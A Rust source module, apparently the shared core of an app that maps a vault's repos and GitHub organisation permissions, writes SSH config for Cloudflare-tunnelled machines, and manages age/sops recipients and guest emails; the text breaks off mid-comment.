//! Logic shared by every platform. Nothing here runs a process or touches the network:
//! callers fetch the JSON (desktop through `gh api`, Android over HTTPS) and pass it in.

pub mod deck;
pub mod exo_repos;
pub mod root_guard;
pub mod session;
pub mod vault_ship;

use serde::Serialize;
use serde_json::Value;
use std::collections::{BTreeMap, BTreeSet};

/// Where a vault keeps its routing file, tried in order.
pub const RULES_PATHS: [&str; 3] = ["System/vault_rules.json", "Project_Management/vault_rules.json", "vault_rules.json"];

/// GitHub repo permission as a rank: 4 admin, 2 write, 1 read, 0 none.
pub fn perm_rank(permission: &str) -> u8 {
    match permission {
        "ADMIN" => 4,
        "MAINTAIN" => 3,
        "WRITE" => 2,
        "TRIAGE" | "READ" => 1,
        _ => 0,
    }
}

/// The routing file's `repos` section, reduced to what the tree needs.
#[derive(Debug, PartialEq)]
pub struct VaultRepos {
    pub org: String,
    pub book: String,
    /// Every repo except the book, with the folders routed to it, in file order.
    pub repos: Vec<(String, Vec<String>)>,
}

/// Parses vault_rules.json. None when the vault is not split into repos.
pub fn vault_repos(rules_json: &str) -> Option<VaultRepos> {
    let v: Value = serde_json::from_str(rules_json).ok()?;
    let rules = v.get("repos")?;
    let org = rules.get("org")?.as_str().filter(|s| !s.is_empty())?.to_string();
    let book = rules.get("book")?.as_str()?.to_string();
    let mut repos: Vec<(String, Vec<String>)> = Vec::new();
    for route in rules.get("routes")?.as_array()? {
        let (Some(prefix), Some(repo)) = (route["prefix"].as_str(), route["repo"].as_str()) else { continue };
        let i = match repos.iter().position(|(r, _)| r == repo) {
            Some(i) => i,
            None => { repos.push((repo.to_string(), Vec::new())); repos.len() - 1 }
        };
        // folders as routed (Papers/), or the file itself when only a file is routed
        let shown = if prefix.ends_with('/') { prefix } else { prefix.rsplit('/').next().unwrap() };
        if !prefix.starts_with('.') && !repos[i].1.iter().any(|f| f == shown) {
            repos[i].1.push(shown.to_string());
        }
    }
    repos.retain(|(r, _)| *r != book);
    Some(VaultRepos { org, book, repos })
}

#[derive(Debug, Serialize, PartialEq)]
pub struct Node {
    pub title: String,
    pub repo: Option<String>,
    pub detail: String,
    pub children: Vec<Node>,
}

fn layer_of(folders: &[String]) -> Option<String> {
    folders.iter().map(|f| f.trim_end_matches('/')).find(|f| {
        let b = f.as_bytes();
        b.len() > 2 && b[0] == b'L' && b[1].is_ascii_digit() && b[2] == b'_'
    }).map(str::to_string)
}

/// Groups the vault's repos by who GitHub grants them to: the whole team, only core, or a domain team.
pub fn build_tree(vault: &VaultRepos, repo_teams: &BTreeMap<String, BTreeSet<String>>) -> Node {
    let groups = [("Layers", "Detail repos, one per domain"), ("Team shared", "Everyone on the team"), ("Founders", "Core only")];
    let mut items: BTreeMap<&str, Vec<Node>> = BTreeMap::new();
    for (repo, folders) in &vault.repos {
        let layer = layer_of(folders);
        let title = match &layer {
            Some(l) => l.replace('_', " "),
            None => {
                let s = repo.strip_prefix("exo-").unwrap_or(repo);
                let mut c = s.chars();
                c.next().map(|f| f.to_uppercase().chain(c).collect()).unwrap_or_default()
            }
        };
        let teams: BTreeSet<&str> = repo_teams.get(repo).into_iter().flatten()
            .map(String::as_str).filter(|t| *t != "core").collect();
        let group = if teams.contains("members") { "Team shared" }
            else if !teams.is_empty() || layer.is_some() { "Layers" } else { "Founders" };
        let detail = if folders.is_empty() { repo.clone() } else { folders.join("  ") };
        items.entry(group).or_default().push(Node { title, repo: Some(repo.clone()), detail, children: vec![] });
    }
    let children = groups.iter().filter_map(|(g, about)| {
        let mut kids = items.remove(g)?;
        kids.sort_by(|a, b| a.title.cmp(&b.title));
        Some(Node { title: g.to_string(), repo: None, detail: about.to_string(), children: kids })
    }).collect();
    Node { title: "main".into(), repo: Some(vault.book.clone()), detail: "Primary logs, guides and templates".into(), children }
}

#[derive(Debug, Serialize, PartialEq)]
pub struct Person {
    pub name: String,
    /// None for org owners, who are admins of every repo.
    pub grants: Option<BTreeMap<String, u8>>,
    /// Not a member of the organisation: an intern or a guest, let in to single repos (an outside collaborator).
    pub outside: bool,
}

#[derive(Debug, Serialize, PartialEq)]
pub struct Team {
    pub slug: String,
    /// (repo, permission rank) this team grants.
    pub repos: Vec<(String, u8)>,
    pub members: BTreeSet<String>,
}

#[derive(Debug, Default, PartialEq)]
pub struct OrgAccess {
    pub people: BTreeMap<String, Person>,
    pub repo_teams: BTreeMap<String, BTreeSet<String>>,
    pub teams: Vec<Team>,
}

/// The GraphQL query whose response `org_access` reads.
pub fn org_query(org: &str) -> String {
    format!("{{ organization(login:\"{org}\") {{ membersWithRole(first:100) {{ edges {{ role node {{ login name }} }} }} \
             teams(first:50) {{ nodes {{ slug members(first:100) {{ nodes {{ login }} }} \
             repositories(first:50) {{ edges {{ permission node {{ name }} }} }} }} }} }} }}")
}

/// Owners, members and teams from the `org_query` response; grants stay empty until `repo_grants`.
/// Default when the response is unreadable.
pub fn org_access(response_json: &str) -> OrgAccess {
    let mut out = OrgAccess::default();
    let Ok(v) = serde_json::from_str::<Value>(response_json) else { return out };
    let org = &v["data"]["organization"];
    let list = |x: &Value| x.as_array().cloned().unwrap_or_default();
    for edge in list(&org["membersWithRole"]["edges"]) {
        let Some(login) = edge["node"]["login"].as_str() else { continue };
        let name = edge["node"]["name"].as_str().filter(|n| !n.is_empty()).unwrap_or(login).to_string();
        let grants = (edge["role"] != "ADMIN").then(BTreeMap::new);
        out.people.insert(login.to_string(), Person { name, grants, outside: false });
    }
    for team in list(&org["teams"]["nodes"]) {
        let slug = team["slug"].as_str().unwrap_or_default();
        let repos: Vec<(String, u8)> = list(&team["repositories"]["edges"]).iter()
            .filter_map(|e| Some((e["node"]["name"].as_str()?.to_string(), perm_rank(e["permission"].as_str()?))))
            .collect();
        for (repo, _) in &repos {
            out.repo_teams.entry(repo.clone()).or_default().insert(slug.to_string());
        }
        let members: BTreeSet<String> = list(&team["members"]["nodes"]).iter()
            .filter_map(|m| m["login"].as_str().map(str::to_string)).collect();
        out.teams.push(Team { slug: slug.to_string(), repos, members });
    }
    out
}

/// Per-repo permissions. Owners may list every repo's collaborators (team and direct grants alike);
/// anyone else can only ask for their own permission on the repos they can see.
pub fn repos_query(org: &str, owner: bool) -> String {
    let field = if owner { "collaborators(first:100, affiliation:ALL) { edges { permission node { login name } } }" } else { "viewerPermission" };
    format!("{{ organization(login:\"{org}\") {{ repositories(first:100) {{ nodes {{ name {field} }} }} }} }}")
}

/// Fills `people`'s grants from a `repos_query` response; `viewer` is who ran it.
pub fn repo_grants(people: &mut BTreeMap<String, Person>, response_json: &str, viewer: &str) {
    let Ok(v) = serde_json::from_str::<Value>(response_json) else { return };
    let Some(repos) = v["data"]["organization"]["repositories"]["nodes"].as_array() else { return };
    // an owner's answer names everyone on each repo. Whoever is on one without being a member is an intern or a
    // guest; they join the list so an owner can look through their eyes as well
    for r in repos {
        for e in r["collaborators"]["edges"].as_array().into_iter().flatten() {
            let Some(login) = e["node"]["login"].as_str().filter(|l| !people.contains_key(*l)) else { continue };
            let name = e["node"]["name"].as_str().filter(|n| !n.is_empty()).unwrap_or(login).to_string();
            people.insert(login.to_string(), Person { name, grants: Some(BTreeMap::new()), outside: true });
        }
    }
    let mut set = |login: &str, repo: &str, perm: &str| {
        if let Some(g) = people.get_mut(login).and_then(|p| p.grants.as_mut()) {
            g.insert(repo.to_string(), perm_rank(perm));
        }
    };
    for r in repos {
        let Some(name) = r["name"].as_str() else { continue };
        if let Some(edges) = r["collaborators"]["edges"].as_array() {
            for e in edges {
                if let (Some(l), Some(p)) = (e["node"]["login"].as_str(), e["permission"].as_str()) { set(l, name, p) }
            }
        } else if let Some(p) = r["viewerPermission"].as_str() {
            set(viewer, name, p);
        }
    }
}

/// Fields left out when the page sends one back take their defaults, so a guest's machine (only host, tunnel and
/// cert known) is still a machine.
#[derive(Debug, Default, Serialize, serde::Deserialize, PartialEq)]
#[serde(default)]
pub struct Machine {
    pub host: String,
    pub repo: String,
    pub account: String,
    /// The account people sign in to the machine as (the host's own `account` in the rules, else ntk). Not `account`
    /// above, which is the repo's name for itself on that machine.
    pub user: String,
    pub ready: bool,
    /// What the machine is, for people who do not know it by alias.
    pub note: String,
    /// A board that is often switched off.
    pub sometimes: bool,
    /// Reached only through this host.
    pub via: Option<String>,
    /// Everyone uses their own account there (an outside service), not a shared repo account.
    pub personal: bool,
    /// The machine's Cloudflare Tunnel hostname, once its tunnel exists; members connect only through it.
    pub tunnel: Option<String>,
    /// The machine's sshd accepts the short-lived certificates its Cloudflare Access application signs (hosts/ssh-cert.sh
    /// ran there), so people sign in as themselves instead of with a key anyone on this computer could use.
    pub cert: bool,
    /// GitHub teams whose members may connect because of this repo (`machines.teams`); core and the machine's own
    /// `machine-<host>` team come on top. The machine's Cloudflare Access policy lists the same teams.
    pub teams: Vec<String>,
}

/// Every (host, code repo, account) from vault_rules.json's `machines` section.
pub fn machines(rules_json: &str) -> Vec<Machine> {
    let Ok(v) = serde_json::from_str::<Value>(rules_json) else { return vec![] };
    let Some(hosts) = v["machines"]["hosts"].as_array() else { return vec![] };
    let by_repo = &v["machines"]["teams"];
    hosts.iter().flat_map(|h| {
        let host = h["host"].as_str().unwrap_or_default().to_string();
        let ready = h["ready"].as_bool().unwrap_or(false);
        let note = h["note"].as_str().unwrap_or_default().to_string();
        let sometimes = h["power"] == "sometimes";
        let via = h["via"].as_str().map(String::from);
        let personal = h["personal"].as_bool().unwrap_or(false);
        let tunnel = h["tunnel"].as_str().filter(|t| !t.is_empty()).map(String::from);
        let cert = h["cert"].as_bool().unwrap_or(false);
        let user = h["account"].as_str().filter(|a| account_ok(a)).unwrap_or("ntk").to_string();
        h["repos"].as_object().into_iter().flatten().map(move |(repo, acct)| Machine {
            host: host.clone(), repo: repo.clone(), account: acct.as_str().unwrap_or_default().to_string(), user: user.clone(), ready,
            note: note.clone(), sometimes, via: via.clone(), personal, tunnel: tunnel.clone(), cert,
            teams: by_repo[repo].as_array().into_iter().flatten().filter_map(|t| t.as_str().map(String::from)).collect(),
        })
    }).collect()
}

/// One machine as a line of vault_rules.json `machines.hosts`, the way the file writes them.
pub fn machine_line(host: &str, repos: &BTreeMap<String, String>, note: &str, tunnel: &str) -> String {
    let mut v = serde_json::json!({ "host": host, "repos": repos, "ready": false });
    if !note.is_empty() { v["note"] = note.into() }
    if !tunnel.is_empty() { v["tunnel"] = tunnel.into() }
    // serde_json's compact form, spaced like the hand-written lines: { "host": "dragon", ... }
    let compact = v.to_string();
    let mut out = String::new();
    let mut in_str = false;
    let mut prev = ' ';
    for c in compact.chars() {
        if c == '"' && prev != '\\' { in_str = !in_str }
        match c {
            '{' if !in_str => out.push_str("{ "),
            '}' if !in_str => out.push_str(" }"),
            ':' if !in_str => out.push_str(": "),
            ',' if !in_str => out.push_str(", "),
            _ => out.push(c),
        }
        prev = c;
    }
    out
}

/// vault_rules.json with its `machines.hosts` changed line by line, everything else kept byte for byte.
/// `edit` gets the parsed host and its line, and returns the new line, or None to drop it; `add` is appended.
/// Err when the result would not parse, or a host to change does not exist.
pub fn edit_machines(text: &str, edit: &dyn Fn(&Value, &str) -> Option<Option<String>>, add: Option<&str>) -> Result<String, String> {
    let lines: Vec<&str> = text.split_inclusive('\n').collect();
    let start = lines.iter().position(|l| l.trim_start().starts_with("\"hosts\": [")).ok_or("no machines.hosts in vault_rules.json")?;
    let end = (start..lines.len()).find(|&i| lines[i].trim_start().starts_with(']')).ok_or("machines.hosts is not closed")?;
    let mut hosts: Vec<String> = vec![];
    let mut touched = false;
    for l in &lines[start + 1..end] {
        let body = l.trim().trim_end_matches(',');
        let parsed: Value = serde_json::from_str(body).map_err(|e| format!("cannot read a machine line: {e}"))?;
        match edit(&parsed, body) {
            Some(Some(new)) => { hosts.push(new); touched = true }
            Some(None) => touched = true,
            None => hosts.push(body.to_string()),
        }
    }
    if let Some(a) = add { hosts.push(a.to_string()); touched = true }
    if !touched { return Err("that machine is not in vault_rules.json".into()) }
    let indent: String = lines.get(start + 1).map(|l| l.chars().take_while(|c| c.is_whitespace()).collect()).unwrap_or("      ".into());
    let body: String = hosts.iter().enumerate()
        .map(|(i, h)| format!("{indent}{h}{}\n", if i + 1 < hosts.len() { "," } else { "" })).collect();
    let out = format!("{}{}{}", lines[..=start].concat(), body, lines[end..].concat());
    serde_json::from_str::<Value>(&out).map_err(|e| format!("the edit would break vault_rules.json: {e}"))?;
    Ok(out)
}

/// The block the app keeps in ~/.ssh/config: one alias per tunnelled machine, reached through the app itself
/// (`app` is its program's path, used as ssh's ProxyCommand). Machines without a tunnel are left out.
pub fn ssh_block(machines: &[Machine], app: &str) -> String {
    // the names come from vault_rules.json, which every member with write access can change, and `Match ... exec`
    // goes through the shell: a name or a tunnel that is not a plain hostname is left out, never written
    let plain = |s: &str, dots: bool| !s.is_empty() && s.len() <= 100 && !s.starts_with(['-', '.']) && !s.contains("..")
        && s.bytes().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == b'-' || (dots && c == b'.'));
    let mut seen = BTreeSet::new();
    let mut out = String::from("# >>> aIwalk System Setup: machines through Cloudflare (this block is rewritten by the app)\n");
    let app = app.replace('%', "%%");   // % is ssh's token marker
    for m in machines {
        let Some(t) = &m.tunnel else { continue };
        if !plain(&m.host, false) || !plain(t, true) { continue }
        if !seen.insert(m.host.clone()) { continue }
        if m.cert {
            // the certificate lasts minutes, so ssh asks the app for a fresh one before every connection (Match exec);
            // the person's own keys are still tried after it, for as long as the machine keeps them
            out += &format!("Match originalhost {} exec \"'{app}' --ssh-cert {t} --quiet\"\n  HostName {t}\n  ProxyCommand \"{app}\" --ssh-proxy %h\n  \
                             IdentityFile ~/.cloudflared/{t}-cf_key\n  CertificateFile ~/.cloudflared/{t}-cf_key-cert.pub\n", m.host);
        } else {
            out += &format!("Host {}\n  HostName {t}\n  ProxyCommand \"{app}\" --ssh-proxy %h\n", m.host);
        }
    }
    out + "# <<< aIwalk System Setup\n"
}

pub fn with_ssh_block(config: &str, block: &str) -> String {
    let start = config.find("# >>> aIwalk System Setup");
    let end = config.find("# <<< aIwalk System Setup").and_then(|i| config[i..].find('\n').map(|n| i + n + 1));
    match (start, end) {
        (Some(a), Some(b)) if a < b => format!("{}{block}{}", &config[..a], &config[b..]),
        _ if config.is_empty() || config.ends_with('\n') => format!("{config}{block}"),
        _ => format!("{config}\n{block}"),
    }
}

/// Machine logins come with write access to the code repo; read access does not include one.
pub fn can_sign_in(m: &Machine, grants: Option<&BTreeMap<String, u8>>) -> bool {
    grants.map_or(true, |g| g.get(&m.repo).copied().unwrap_or(0) >= 2)
}

/// A REST `permissions` object ({admin, maintain, push, triage, pull}) as a rank: 4 admin, 3 maintain, 2 write, 1 read, 0 none.
pub fn permissions_rank(p: &Value) -> u8 {
    if p["admin"] == true { 4 } else if p["maintain"] == true { 3 } else if p["push"] == true { 2 }
    else if p["triage"] == true || p["pull"] == true { 1 } else { 0 }
}

/// (who may merge, who may only open pull requests) from `repos/o/r/collaborators`: the vault plugin offers Merge
/// at maintain or admin, and opening a pull request needs write.
pub fn merge_rights(collaborators: &[Value]) -> (Vec<String>, Vec<String>) {
    let at = |want: &dyn Fn(u8) -> bool| collaborators.iter().filter(|c| want(permissions_rank(&c["permissions"])))
        .filter_map(|c| c["login"].as_str().map(String::from)).collect();
    (at(&|r| r >= 3), at(&|r| r == 2))
}

/// An access request travels as an issue; the body carries what is asked for, the author is who asks.
pub fn request_body(repo: &str, level: &str, note: &str) -> String {
    format!("repo: {repo}\nlevel: {level}\n\n{note}\n\n<!-- sent by aIwalk System Setup -->")
}

/// (repo, level) from a request body; None unless both are there and level is read or write.
pub fn parse_request(body: &str) -> Option<(String, String)> {
    let field = |k: &str| body.lines().find_map(|l| l.strip_prefix(k)).map(|v| v.trim().to_string());
    let (repo, level) = (field("repo:")?, field("level:")?);
    // a repo's name and nothing else: it becomes part of an API path with an owner's rights behind it
    let named = !repo.is_empty() && repo.len() <= 100 && !repo.starts_with('.')
        && repo.bytes().all(|c| c.is_ascii_alphanumeric() || b"._-".contains(&c));
    (named && (level == "read" || level == "write")).then_some((repo, level))
}

/// How to give `login` exactly `level` (0 none, 1 read, 2 write) on `repo`.
#[derive(Debug, PartialEq, Default)]
pub struct AccessPlan {
    /// The repo's own write team (it grants only this repo) to join.
    pub join: Option<String>,
    /// Single-repo teams that give more than `level`, to leave.
    pub leave: Vec<String>,
    /// The direct grant to set: None removes it, Some("pull" | "push") sets it.
    pub direct: Option<&'static str>,
    /// Teams that also cover other repos and still give more than `level`; changing them would change those repos too.
    pub blocked_by: Vec<String>,
}

pub fn plan_access(teams: &[Team], login: &str, repo: &str, level: u8) -> AccessPlan {
    let mut plan = AccessPlan::default();
    let gives = |t: &Team| t.repos.iter().find(|(r, _)| r == repo).map(|(_, rank)| *rank);
    let own = |t: &Team| t.slug != "core" && t.repos.len() == 1;
    for t in teams.iter().filter(|t| t.members.contains(login)) {
        match gives(t) {
            Some(rank) if rank > level && own(t) => plan.leave.push(t.slug.clone()),
            Some(rank) if rank > level => plan.blocked_by.push(t.slug.clone()),
            _ => {}
        }
    }
    let team_write = teams.iter().find(|t| own(t) && gives(t) == Some(2));
    match (level, team_write) {
        (2, Some(t)) => { if !t.members.contains(login) { plan.join = Some(t.slug.clone()) } }
        (2, None) => plan.direct = Some("push"),
        (1, _) => plan.direct = Some("pull"),
        _ => {}
    }
    plan
}

/// One GitHub account gh is signed in to on this computer, from `gh auth status`.
#[derive(Debug, Serialize, PartialEq, Default)]
pub struct Auth {
    pub login: String,
    /// The account git and this app use right now; gh keeps the others for switching.
    pub active: bool,
    /// "account" for a browser sign-in (gho_ token), "temporary" for a fine-grained token (github_pat_, always expires).
    pub method: String,
    /// "ssh" or "https", how git talks to GitHub.
    pub protocol: String,
}

pub fn parse_gh_status(text: &str) -> Vec<Auth> {
    let mut accounts: Vec<Auth> = vec![];
    for line in text.lines() {
        if let Some(rest) = line.split("Logged in to github.com account ").nth(1) {
            accounts.push(Auth { login: rest.split_whitespace().next().unwrap_or_default().into(), ..Default::default() });
            continue;
        }
        let Some(a) = accounts.last_mut() else { continue };
        let Some((key, value)) = line.trim().trim_start_matches("- ").split_once(": ") else { continue };
        match key {
            "Active account" => a.active = value == "true",
            "Git operations protocol" => a.protocol = value.into(),
            "Token" if value.starts_with("github_pat_") => a.method = "temporary".into(),
            "Token" => a.method = "account".into(),
            _ => {}
        }
    }
    accounts
}

/// An age public key: "age1" then bech32 text, or a plugin recipient such as "age1yubikey1…".
pub fn is_age_public_key(k: &str) -> bool {
    k.starts_with("age1") && k.len() >= 58 && k.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit())
}

/// An age-key request carries only the public key; the issue's author is who it belongs to.
pub fn age_request_body(public_key: &str) -> String {
    format!("age-key: {public_key}\n\n<!-- sent by aIwalk System Setup; the private key never leaves the computer -->")
}

pub fn parse_age_request(body: &str) -> Option<String> {
    body.lines().find_map(|l| l.strip_prefix("age-key:")).map(str::trim).filter(|k| is_age_public_key(k)).map(String::from)
}

/// exo-secrets' recipients.txt: `login age1…` per line, the list of who can decrypt. Comments start with #.
pub fn parse_recipients(text: &str) -> Vec<(String, String)> {
    text.lines().map(str::trim).filter(|l| !l.is_empty() && !l.starts_with('#'))
        .filter_map(|l| l.split_once(char::is_whitespace))
        .map(|(who, key)| (who.to_string(), key.trim().to_string()))
        .filter(|(_, k)| is_age_public_key(k)).collect()
}

/// Adds or replaces `login`'s key (one key per person), or drops `login` when `key` is None.
pub fn with_recipient(text: &str, login: &str, key: Option<&str>) -> String {
    let mut list: Vec<(String, String)> = parse_recipients(text).into_iter().filter(|(w, _)| w != login).collect();
    if let Some(k) = key { list.push((login.into(), k.into())) }
    list.sort();
    let body: String = list.iter().map(|(w, k)| format!("{w} {k}\n")).collect();
    format!("# Who can decrypt this repo: GitHub login and age public key. Changed by aIwalk System Setup;\n\
             # .sops.yaml is generated from this file.\n{body}")
}

/// .sops.yaml encrypting every file to every recipient.
pub fn sops_config(recipients: &[(String, String)]) -> String {
    let keys: Vec<&str> = recipients.iter().map(|(_, k)| k.as_str()).collect();
    format!("# Generated from recipients.txt by aIwalk System Setup; edit that file instead.\ncreation_rules:\n  - age: >-\n      {}\n", keys.join(",\n      "))
}

/// What `user` may see: org owners see everyone (for View as), anyone else only their own grants.
pub fn visible_to(mut people: BTreeMap<String, Person>, user: &str) -> BTreeMap<String, Person> {
    if people.get(user).is_some_and(|p| p.grants.is_none()) {
        return people;
    }
    people.remove(user).map(|p| BTreeMap::from([(user.to_string(), p)])).unwrap_or_default()
}

/// Whether the People page may offer edits: an org owner whose token also carries `admin:org`, the permission
/// GitHub asks for before it lets anyone change the organisation. Everyone else gets the page read-only.
pub fn can_edit_people(owner: bool, scopes: &[String]) -> bool {
    owner && scopes.iter().any(|s| s == "admin:org")
}

/// The version a terms text declares in its first lines: `<!-- terms version: N -->`.
pub fn terms_version(text: &str) -> Option<u32> {
    text.lines().take(5).find_map(|l| l.trim().strip_prefix("<!-- terms version:")?.trim().strip_suffix("-->")?.trim().parse().ok())
}

/// The VERSION line near the top of a host tool in hosts/ (`VERSION = "1"` in Python, `VERSION=1` in bash), read the
/// same way exo-status.py reads the installed copies, so the app and the machines compare like with like.
pub fn host_tool_version(text: &str) -> Option<u32> {
    text.lines().find_map(|l| {
        let (_, v) = l.split_once('=').filter(|(k, _)| k.trim() == "VERSION")?;
        v.split('#').next()?.trim().trim_matches(['"', '\'']).parse().ok()
    })
}

/// One line for a machine's row: "Host tools: current", or which installed tools are older, newer or missing, from
/// `found` (exo-status.py's "tools": name -> version or null; absent on a status page from before versions) and the
/// versions this app ships.
pub fn host_tools_line(found: &Value, shipped: &[(&str, u32)]) -> String {
    if found.is_null() { return "Host tools: older than this app (the status page does not report versions yet)".into() }
    let off: Vec<String> = shipped.iter().filter_map(|&(name, want)| match found[name].as_u64() {
        None => Some(format!("{name} missing")),
        Some(v) if v < want as u64 => Some(format!("{name} older")),
        Some(v) if v > want as u64 => Some(format!("{name} newer than this app")),
        _ => None,
    }).collect();
    if off.is_empty() { "Host tools: current".into() } else { format!("Host tools: {}", off.join(", ")) }
}

/// The title of the issue that records one person accepting a version; its author is who accepted.
pub fn terms_title(version: u32) -> String { format!("Terms v{version} accepted") }

/// (version, date) of the newest acceptance among GitHub issue rows (title, created_at), if any.
pub fn terms_accepted(issues_json: &str) -> Option<(u32, String)> {
    let rows: Vec<Value> = serde_json::from_str(issues_json).unwrap_or_default();
    rows.iter().filter_map(|r| {
        let v = r["title"].as_str()?.strip_prefix("Terms v")?.strip_suffix(" accepted")?.parse().ok()?;
        Some((v, r["created_at"].as_str().unwrap_or_default().chars().take(10).collect()))
    }).max()
}

/// One repo an intern has, or is invited to: `invite` is the pending invitation's id, None once accepted.
#[derive(Serialize, Debug, PartialEq)]
pub struct InternRepo { pub repo: String, pub level: String, pub invite: Option<u64> }

/// Someone outside the organisation with grants on single repos (an intern), accepted or still invited.
#[derive(Serialize, Debug, PartialEq)]
pub struct Intern { pub login: String, pub repos: Vec<InternRepo> }

/// One row per intern from GitHub's lists: `outside` the org's outside collaborators, `collaborators` and
/// `invitations` per repo (a repo's outside collaborators and its pending invitations). Org `members` are left out:
/// a member can also hold a repo invitation, and members are managed as members.
pub fn interns(outside: &[Value], collaborators: &[(String, Vec<Value>)], invitations: &[(String, Vec<Value>)], members: &BTreeSet<String>) -> Vec<Intern> {
    let mut by: BTreeMap<String, Vec<InternRepo>> = BTreeMap::new();
    for o in outside { if let Some(l) = o["login"].as_str() { by.entry(l.into()).or_default(); } }
    for (repo, rows) in collaborators { for c in rows { if let Some(l) = c["login"].as_str() {
        by.entry(l.into()).or_default().push(InternRepo { repo: repo.clone(), level: c["role_name"].as_str().unwrap_or("read").into(), invite: None });
    } } }
    for (repo, rows) in invitations { for i in rows { if let Some(l) = i["invitee"]["login"].as_str() {
        by.entry(l.into()).or_default().push(InternRepo { repo: repo.clone(), level: i["permissions"].as_str().unwrap_or("read").into(), invite: i["id"].as_u64() });
    } } }
    by.into_iter().filter(|(l, _)| !members.contains(l)).map(|(login, repos)| Intern { login, repos }).collect()
}

/// Whether release tag `tag` ("v0.3.0") is a later version than this app's `current` ("0.2.0"). Numbers compare as
/// numbers, so 0.10.0 is later than 0.9.0; a tag that is not a version is never later.
pub fn newer(tag: &str, current: &str) -> bool {
    let nums = |v: &str| v.trim().trim_start_matches('v').split('.').map(|n| n.parse::<u32>().ok()).collect::<Option<Vec<_>>>();
    matches!((nums(tag), nums(current)), (Some(t), Some(c)) if t > c)
}

/// Logins on `then` (one per line, the owners when a secret was last shared) that are not among `now`.
/// GitHub logins compare without regard to case.
pub fn owners_gone(then: &str, now: &[String]) -> Vec<String> {
    then.lines().map(str::trim).filter(|l| !l.is_empty() && !now.iter().any(|n| n.eq_ignore_ascii_case(l))).map(String::from).collect()
}

/// The version in what `python --version` printed, when it is Python 3 ("Python 3.12.4" gives "3.12.4"). Python 2
/// and the Microsoft Store alias's "Python was not found ..." give None.
pub fn python_version(out: &str) -> Option<String> {
    let v = out.lines().find_map(|l| l.trim().strip_prefix("Python "))?.trim();
    (v.starts_with("3.") && v.chars().all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '+')).then(|| v.to_string())
}

/// Takes terminal resize requests out of a byte stream headed for a pseudo-terminal. A request is
/// ESC ] 777 ; resize ; COLS ; ROWS BEL. Everything else passes through untouched, in order, including bytes that
/// only began like a request. A request may be split across reads; the scanner keeps the unfinished part, with one
/// exception: an ESC that ends a read is passed on at once. On its own it is the Esc key (how a person interrupts
/// Claude), and holding it until the next byte made the key seem dead. A request is written whole, so its ESC does
/// not arrive alone.
#[derive(Default)]
pub struct ResizeScanner { held: Vec<u8> }

impl ResizeScanner {
    const START: &'static [u8] = b"\x1b]777;resize;";

    /// (bytes for the terminal, sizes asked for as (cols, rows)) from the next chunk of the stream.
    pub fn feed(&mut self, chunk: &[u8]) -> (Vec<u8>, Vec<(u16, u16)>) {
        let (mut out, mut sizes) = (Vec::with_capacity(chunk.len()), vec![]);
        for &b in chunk {
            if self.held.is_empty() {
                if b == 0x1b { self.held.push(b) } else { out.push(b) }
                continue;
            }
            let at = self.held.len();
            if at < Self::START.len() {
                if b == Self::START[at] { self.held.push(b); continue }
            } else if b == 0x07 {
                let body = String::from_utf8_lossy(&self.held[Self::START.len()..]).into_owned();
                let size = body.split_once(';').and_then(|(c, r)| Some((c.parse().ok()?, r.parse().ok()?)));
                match size { Some(s) => { sizes.push(s); self.held.clear(); continue } None => {} }
            } else if (b.is_ascii_digit() || b == b';') && at < Self::START.len() + 11 {
                self.held.push(b);
                continue;
            }
            // not a request after all: what was held goes to the terminal, and this byte is looked at afresh
            out.append(&mut self.held);
            if b == 0x1b { self.held.push(b) } else { out.push(b) }
        }
        if self.held == [0x1b] { out.append(&mut self.held) }
        (out, sizes)
    }
}

/// Where other programs should be told to find this app, given where it runs from now. macOS runs an app opened
/// from Downloads or from the disk image out of a random read-only folder (App Translocation) that is gone when the
/// app quits; a path like that written into git's or ssh's settings breaks them the moment the app closes (issue
/// #4). There the copy in Applications is named instead when one exists, and None says there is no place to name
/// yet: nothing is written, and the page asks for the app to be moved.
pub fn lasting_app_path(exe: &str, home: &str, exists: impl Fn(&str) -> bool) -> Option<String> {
    if !(exe.contains("/AppTranslocation/") || exe.starts_with("/Volumes/")) { return Some(exe.to_string()) }
    let inside = exe.find(".app/").map(|i| &exe[exe[..i].rfind('/').map_or(0, |j| j + 1)..])?;   // "<Name>.app/Contents/MacOS/<bin>"
    ["/Applications".to_string(), format!("{home}/Applications")].into_iter().map(|d| format!("{d}/{inside}")).find(|p| exists(p))
}

/// The AppImage this program was started from, when it really is one. APPIMAGE and APPDIR are inherited by every
/// child of ANY AppImage (Obsidian is one, so the vault plugin's spawns carry Obsidian's), so they count only when
/// this program's own file lies under APPDIR, the folder the AppImage is mounted at while it runs.
pub fn own_appimage(appimage: Option<&str>, appdir: Option<&str>, exe: &str) -> Option<String> {
    let (image, dir) = (appimage.filter(|s| !s.is_empty())?, appdir.filter(|s| !s.is_empty())?);
    let dir = dir.trim_end_matches('/');
    exe.strip_prefix(dir).is_some_and(|rest| rest.starts_with('/')).then(|| image.to_string())
}

/// What a git credential helper answers to `get`: the account for https://github.com, nothing for anywhere else.
/// `input` is git's request, `key=value` lines.
pub fn credential_reply(input: &str, login: &str, token: &str) -> Option<String> {
    let field = |k: &str| input.lines().find_map(|l| l.trim_end().strip_prefix(k)?.strip_prefix('='));
    (field("protocol") == Some("https") && field("host") == Some("github.com")).then(|| format!("username={login}\npassword={token}\n"))
}

// ---------------------------------------------------------------- machine guests
// An intern is no organisation member, so no GitHub team can hold them. A machine's Cloudflare Access policy can
// still let one person in by the email of the identity they sign in with: an include rule {"email": {"email": …}}.

/// `email` as Access compares it: trimmed, lower case, one "@" with something on both sides, no spaces, at most 254.
pub fn guest_email(email: &str) -> Result<String, String> {
    let e = email.trim().to_lowercase();
    let ok = e.len() <= 254 && !e.chars().any(char::is_whitespace)
        && matches!(e.split_once('@'), Some((a, b)) if !a.is_empty() && !b.is_empty() && !b.contains('@'));
    if ok { Ok(e) } else { Err(format!("\"{}\" is not an email address", email.trim())) }
}

/// The application's allow policy: the first one deciding "allow".
pub fn allow_policy(app: &Value) -> Option<&Value> {
    app["policies"].as_array()?.iter().find(|p| p["decision"] == "allow")
}

/// The emails a policy lets in one by one, lower case, in the policy's order; every other kind of rule is skipped.
pub fn policy_emails(policy: &Value) -> Vec<String> {
    policy["include"].as_array().into_iter().flatten()
        .filter_map(|r| r["email"]["email"].as_str().map(str::to_lowercase)).collect()
}

/// `include` with the email rule for `email` (already from `guest_email`) added at the end or removed. Every other
